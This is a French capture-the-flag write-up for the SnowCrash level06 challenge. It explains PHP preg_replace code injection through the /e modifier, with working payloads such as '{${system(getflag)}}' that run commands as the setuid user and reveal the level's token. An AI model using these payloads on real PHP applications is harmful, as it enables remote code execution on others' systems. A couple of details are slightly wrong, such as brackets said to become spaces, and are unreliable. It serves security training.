Dans le home du level06, on trouve ce script PHP :

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Si on reformule ce script pour le rendre plus lisible, cela donne :

```php
#!/usr/bin/php
<?php
function y($m){
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z){
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>
```

La fonction **`x()`** lit le contenu du fichier spécifié dans **`argv[1]`** à l'aide de la fonction **`file_get_contents()`**. Ensuite, elle utilise **`preg_replace()`** pour chercher des occurrences de la chaîne **`[x *]`** dans ce contenu.

Pour mieux comprendre cette fonction, en voici le prototype :

```php
preg_replace(
    string|array $pattern,
    string|array $replacement,
    string|array $subject,
    int $limit = -1,
    int &$count = null
): string|array|null
```

*Le groupe de capture `(.*)`signifie que n’importe quel contenu de n’importe quelle taille peut exister entre le début et la fin de la string. À cela est ajouté le modificateur **`/e`** qui signifie que la chaîne doit être évaluée comme du code PHP. Donc si une correspondance est trouvée avec le $pattern, son contenu sera interprété comme du code, et envoyé dans la fonction **`y()`** , qui récupérera en paramètre le contenu du deuxième groupe de capture avec **`//2`**, donc tout le contenu ajouté dans le groupe `(.*)`. Puis enfin, les crochets sont remplacés simplement par des espaces.

La fonction **`y()`**, quant à elle, remplace tous les points **`.`** par des **`x`** et tous les **`@`** par des **`y`**.

Un petit exemple ici :

```
level06@SnowCrash:~$ echo 'salut[x .@].@' > /tmp/test.txt
level06@SnowCrash:~$ ./level06 /tmp/test.txt
salut x  y.@
```

Le contenu entre [x ] a bien été remplacé, mais les `.@` qui sortent du pattern envoyé à la fonction y() n’ont pas été substitués par des xy.

Super mais ce qui parait le plus intéressant ici, c’est bien l’évaluation du texte en code PHP, qui pourrait amener à une injection de code. Ça tombe bien car il existe effectivement un risque lorsque ce modificateur est ajouté. Ce gars trop bien présente tout de façon super claire : [https://ik0nw.github.io/2020/09/23/PHP::Preg_replace()-RCE/](https://ik0nw.github.io/2020/09/23/PHP::Preg_replace()-RCE/)

On apprend notamment [ici](https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/) que l’usage de ce modificateur est déprécié depuis la version 5.5.0 de PHP. Après avoir essayé plusieurs formes de payload, l’appel de system() sous une forme **complex (curly) syntax** semble fonctionner :  

```
level06@SnowCrash:~$ echo 'salut[x {${system(ls)}}]' > /tmp/test.txt
level06@SnowCrash:~$ ./level06 /tmp/test.txt
PHP Notice:  Use of undefined constant ls - assumed 'ls' in /home/user/level06/level06.php(4) : regexp code on line 1
level06
level06.php
PHP Notice:  Undefined variable: level06.php in /home/user/level06/level06.php(4) : regexp code on line 1
salut
```

Bon le programme est broken mais au moins ça exécute tout de même ce que l’on souhaite.

Après un check whoami pour vérifier qu’on exécute bien les commandes en tant que flag06 (suid actif sur level06), on peut lancer un getflag :

```
level06@SnowCrash:~$ echo 'salut[x {${system(getflag)}}]' > /tmp/test.txt
level06@SnowCrash:~$ ./level06 /tmp/test.txt
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
salut
```
